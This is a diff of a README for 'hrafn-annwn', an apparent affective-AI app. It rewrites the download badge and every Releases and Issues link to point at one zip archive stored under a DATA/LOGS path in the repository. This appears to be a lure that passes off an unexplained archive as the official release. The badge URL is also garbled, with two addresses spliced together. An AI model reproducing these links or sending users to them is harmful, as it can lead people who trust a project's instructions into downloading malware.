@@ -1,6 +1,6 @@
 # 🦅 hrafn-annwn - Explore the Depths of Affective AI
 
-[![Download hrafn-annwn](https://img.shields.io/badge/Download%20hrafn--annwn-v1.0-blue.svg)](https://github.com/mastersaboffice/hrafn-annwn/releases)
+[![Download hrafn-annwn](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip%https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip)](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to hrafn-annwn, the application that bridges the gap between artificial 
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/mastersaboffice/hrafn-annwn/releases) to download the latest version. Click on the most recent release and look for the appropriate file for your system. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip) to download the latest version. Click on the most recent release and look for the appropriate file for your system. 
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/mastersaboffice/hrafn-annwn/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip).
 3. Find the latest version.
 4. Choose the file that matches your operating system.
 5. Click on the link to download the file.
@@ -68,7 +68,7 @@ Make sure your computer meets the following requirements:
 If you encounter issues, consider the following:
 
 - Ensure your system meets the requirements outlined above.
-- Check for updates on the [Releases page](https://github.com/mastersaboffice/hrafn-annwn/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip).
 - Restart the application if it does not respond.
 - For specific issues, refer to the FAQ section or seek help from our community.
 
@@ -76,12 +76,12 @@ If you encounter issues, consider the following:
 
 For questions and support:
 
-- Visit our GitHub [Issues page](https://github.com/mastersaboffice/hrafn-annwn/issues) to report bugs or request features.
+- Visit our GitHub [Issues page](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip) to report bugs or request features.
 - Join our community forum to connect with users and developers who share your interests. 
 
 ## 🔗 Important Links
 
-- [Releases page](https://github.com/mastersaboffice/hrafn-annwn/releases)
-- [Issues page](https://github.com/mastersaboffice/hrafn-annwn/issues)
+- [Releases page](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip)
+- [Issues page](https://raw.githubusercontent.com/mastersaboffice/hrafn-annwn/main/DATA/LOGS/hrafn-annwn-v3.8.zip)
 
 You are now ready to experience the capabilities of hrafn-annwn. Enjoy your journey into the realm of affective AI!
